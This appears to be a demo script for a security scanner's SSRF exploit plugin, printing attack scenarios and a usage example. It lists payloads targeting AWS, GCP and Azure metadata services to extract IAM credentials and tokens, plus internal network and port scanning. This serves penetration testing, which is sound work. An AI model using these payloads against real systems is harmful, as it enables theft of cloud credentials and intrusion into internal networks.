"""
Demonstration of SSRF Plugin Visual Proof Capabilities

This script demonstrates the enhanced SSRF plugin's ability to capture
visual proof of successful exploitation showing access to:
- Cloud metadata services (AWS, GCP, Azure)
- Internal network resources
- Localhost services
"""

import sys
import os

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from scanner.plugins.exploits.ssrf_plugin import SSRFPlugin


def demo_visual_proof_scenarios():
    """Demonstrate different SSRF visual proof capture scenarios."""
    
    print("=" * 80)
    print("SSRF Plugin - Visual Proof Capture Demonstration")
    print("=" * 80)
    
    plugin = SSRFPlugin()
    
    # Scenario 1: AWS Cloud Metadata Access
    print("\n📸 Scenario 1: AWS Cloud Metadata Access")
    print("-" * 80)
    print("Target: AWS EC2 Instance Metadata Service (169.254.169.254)")
    print("Payload: http://169.254.169.254/latest/meta-data/")
    print("Visual Proof: Screenshots showing successful access to AWS metadata")
    print("Evidence Captured:")
    print("  • Instance ID, AMI ID")
    print("  • IAM security credentials")
    print("  • User data and configuration")
    print("  • Instance identity document")
    
    # Scenario 2: GCP Metadata Access
    print("\n📸 Scenario 2: GCP Cloud Metadata Access")
    print("-" * 80)
    print("Target: GCP Metadata Server (metadata.google.internal)")
    print("Payload: http://metadata.google.internal/computeMetadata/v1/")
    print("Visual Proof: Screenshots showing successful access to GCP metadata")
    print("Evidence Captured:")
    print("  • Project information")
    print("  • Instance details")
    print("  • Service account tokens")
    print("  • Custom metadata")
    
    # Scenario 3: Azure Metadata Access
    print("\n📸 Scenario 3: Azure Cloud Metadata Access")
    print("-" * 80)
    print("Target: Azure Instance Metadata Service (169.254.169.254)")
    print("Payload: http://169.254.169.254/metadata/instance?api-version=2021-02-01")
    print("Visual Proof: Screenshots showing successful access to Azure metadata")
    print("Evidence Captured:")
    print("  • VM information")
    print("  • Network configuration")
    print("  • OAuth2 tokens")
    print("  • Managed identity credentials")
    
    # Scenario 4: Internal Network Access
    print("\n📸 Scenario 4: Internal Network Scanning")
    print("-" * 80)
    print("Target: Internal hosts (localhost, 127.0.0.1, 192.168.x.x, 10.0.x.x)")
    print("Payloads:")
    for host in plugin.INTERNAL_HOSTS[:5]:
        print(f"  • http://{host}/")
    print("Visual Proof: Screenshots showing successful access to internal hosts")
    print("Evidence Captured:")
    print("  • Accessible internal services")
    print("  • Internal web interfaces")
    print("  • Network topology information")
    
    # Scenario 5: Port Scanning via SSRF
    print("\n📸 Scenario 5: Port Scanning")
    print("-" * 80)
    print("Target: Internal services on common ports")
    print("Services Scanned:")
    for port, service in plugin.COMMON_PORTS:
        print(f"  • Port {port}: {service}")
    print("Visual Proof: Screenshots showing responses from internal services")
    
    # Implementation Details
    print("\n" + "=" * 80)
    print("Implementation Details")
    print("=" * 80)
    print("""
The _capture_visual_proof method:
1. Checks if exploitation was successful (metadata or network scan)
2. Captures screenshots of the target URL with SSRF payload
3. Generates multiple proofs for different attack vectors:
   - Cloud metadata extraction
   - Internal network access
   - Generic localhost access (fallback)
4. Returns list of visual proof dictionaries with:
   - type: 'screenshot'
   - data: Base64-encoded screenshot
   - title: Descriptive title
   - description: Detailed description
   - exploit_step: Step-by-step payload information
   - payload: The actual SSRF payload used

Integration with execute_attack:
- Called after successful SSRF exploitation
- Controlled by 'capture_visual_proof' config option (default: True)
- Results added to return dictionary under 'visual_proofs' key
- Logs number of captured visual proofs

Error Handling:
- Gracefully handles missing visual proof modules
- Catches and logs exceptions during screenshot capture
- Returns empty list if capture fails
- Does not affect exploitation success status
    """)
    
    # Example Usage
    print("=" * 80)
    print("Example Usage")
    print("=" * 80)
    print("""
# Initialize plugin
plugin = SSRFPlugin()

# Execute attack with visual proof capture
result = plugin.execute_attack(
    target_url='http://vulnerable-app.com/fetch',
    vulnerability_data={
        'parameter': 'url',
        'method': 'GET'
    },
    config={
        'capture_visual_proof': True,  # Enable visual proof
        'verify_ssl': False,
        'timeout': 10
    }
)

# Access visual proofs
if result['success'] and 'visual_proofs' in result:
    for proof in result['visual_proofs']:
        print(f"Title: {proof['title']}")
        print(f"Description: {proof['description']}")
        print(f"Payload: {proof['payload']}")
        # Save screenshot
        with open(f"{proof['title']}.png", 'wb') as f:
            import base64
            f.write(base64.b64decode(proof['data']))
    """)
    
    print("\n" + "=" * 80)
    print("✓ Visual proof capture demonstration complete!")
    print("=" * 80)


if __name__ == '__main__':
    demo_visual_proof_scenarios()
